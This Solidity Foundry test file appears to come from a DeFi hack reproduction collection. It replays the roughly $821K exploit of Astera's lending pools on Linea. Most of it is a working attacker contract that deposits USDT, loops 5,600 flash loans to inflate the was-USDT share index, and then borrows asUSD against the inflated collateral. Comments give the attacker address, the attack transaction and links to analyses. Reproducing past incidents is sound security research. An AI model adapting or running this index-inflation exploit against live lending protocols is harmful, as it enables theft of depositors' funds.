// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~821K USD
// Attacker : https://lineascan.build/address/0x8a3207c5c8410989dec8d95b5ad880411985ecfd
// Attack Tx :
// https://app.blocksec.com/explorer/tx/linea/0x332e5958ff8182278c1ea5c0a0582d3e8027f39abfe87ce30d30a09e990a884f
// Vulnerable Contract : https://lineascan.build/address/0x17d8a5305a37fe93e13a28f09c46db5be24e1b9e

// @Analysis
// https://x.com/hklst4r/status/1976296543872233508
// https://smartcontractshacking.com/hacks/astera-fi-hack-2025

interface IAsteraLendingPool {
    struct FlashLoanParams {
        address receiverAddress;
        address[] assets;
        bool[] reserveTypes;
        address onBehalfOf;
    }

    function deposit(
        address asset,
        bool reserveType,
        uint256 amount,
        address onBehalfOf
    ) external;
    function flashLoan(
        FlashLoanParams calldata flashLoanParams,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        bytes calldata params
    ) external;
}

interface IAsteraMiniPool {
    struct FlashLoanParams {
        address receiverAddress;
        address[] assets;
        address onBehalfOf;
    }

    function deposit(
        address asset,
        bool wrap,
        uint256 amount,
        address onBehalfOf
    ) external;
    function borrow(
        address asset,
        bool unwrap,
        uint256 amount,
        address onBehalfOf
    ) external;
    function flashLoan(
        FlashLoanParams calldata flashLoanParams,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        bytes calldata params
    ) external;
    function getUserAccountData(
        address user
    )
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
}

interface IATokenNonRebasing is IERC20 {
    function ATOKEN_ADDRESS() external view returns (address);
    function convertToAssets(
        uint256 shareAmount
    ) external view returns (uint256);
}

contract ContractTest is Test {
    uint256 constant FORK_BLOCK = 24_321_060;

    address constant USDT = 0xA219439258ca9da29E9Cc4cE5596924745e12B93;
    address constant WAS_USDT = 0x1579072d23FB3f545016Ac67E072D37e1281624C;
    address constant AS_USD = 0xa500000000e482752f032eA387390b6025a2377b;

    address constant LENDING_POOL = 0x17d8a5305A37fe93E13a28f09c46db5bE24E1B9E;
    address constant MINI_POOL = 0x0baFB30B72925e6d53F4d0A089bE1CeFbB5e3401;

    AsteraAttacker attacker;

    function setUp() public {
        vm.createSelectFork("https://rpc.linea.build", FORK_BLOCK);

        vm.label(USDT, "USDT");
        vm.label(WAS_USDT, "was-USDT");
        vm.label(AS_USD, "asUSD");
        vm.label(LENDING_POOL, "Astera LendingPool");
        vm.label(MINI_POOL, "Astera MiniPool");

        attacker = new AsteraAttacker();
        deal(USDT, address(attacker), 1_000_000e6);
    }

    function testExploit() public {
        uint256 startPrice = IATokenNonRebasing(WAS_USDT).convertToAssets(1e6);
        emit log_named_uint("was-USDT assets per 1 share before", startPrice);

        attacker.exploit();

        uint256 endPrice = IATokenNonRebasing(WAS_USDT).convertToAssets(1e6);
        uint256 profit = IERC20(AS_USD).balanceOf(address(attacker));

        emit log_named_uint("was-USDT assets per 1 share after", endPrice);
        emit log_named_decimal_uint("asUSD profit", profit, 18);

        assertGt(endPrice, 100e6);
        assertGt(profit, 1000e18);
    }
}

contract AsteraAttacker {
    address constant USDT = 0xA219439258ca9da29E9Cc4cE5596924745e12B93;
    address constant WAS_USDT = 0x1579072d23FB3f545016Ac67E072D37e1281624C;
    address constant AS_USD = 0xa500000000e482752f032eA387390b6025a2377b;

    IAsteraLendingPool constant LENDING_POOL = IAsteraLendingPool(0x17d8a5305A37fe93E13a28f09c46db5bE24E1B9E);
    IAsteraMiniPool constant MINI_POOL = IAsteraMiniPool(0x0baFB30B72925e6d53F4d0A089bE1CeFbB5e3401);

    function exploit() external {
        _buildWasUsdtPosition();
        _inflateWasUsdtIndex();
        _drainMiniPool();
    }

    function _buildWasUsdtPosition() private {
        IERC20(USDT).approve(address(LENDING_POOL), type(uint256).max);
        LENDING_POOL.deposit(USDT, true, 6000e6, address(this));

        uint256 wasUsdtBalance = IERC20(WAS_USDT).balanceOf(address(this));
        IERC20(WAS_USDT).approve(address(MINI_POOL), type(uint256).max);
        MINI_POOL.deposit(WAS_USDT, false, wasUsdtBalance, address(this));

        MINI_POOL.borrow(WAS_USDT, true, 4800e6, address(this));
    }

    function _inflateWasUsdtIndex() private {
        address[] memory assets = new address[](1);
        assets[0] = USDT;

        bool[] memory reserveTypes = new bool[](1);
        reserveTypes[0] = true;

        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);

        IAsteraLendingPool.FlashLoanParams memory params = IAsteraLendingPool.FlashLoanParams({
            receiverAddress: address(this), assets: assets, reserveTypes: reserveTypes, onBehalfOf: address(this)
        });

        address aToken = IATokenNonRebasing(WAS_USDT).ATOKEN_ADDRESS();
        for (uint256 i; i < 5600; ++i) {
            uint256 liquidity = IERC20(USDT).balanceOf(aToken);
            amounts[0] = liquidity - 1;
            LENDING_POOL.flashLoan(params, amounts, modes, "");
        }
    }

    function _drainMiniPool() private {
        MINI_POOL.borrow(AS_USD, true, 1600e18, address(this));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        IERC20(assets[0]).approve(msg.sender, amounts[0] + premiums[0]);
        return true;
    }
}
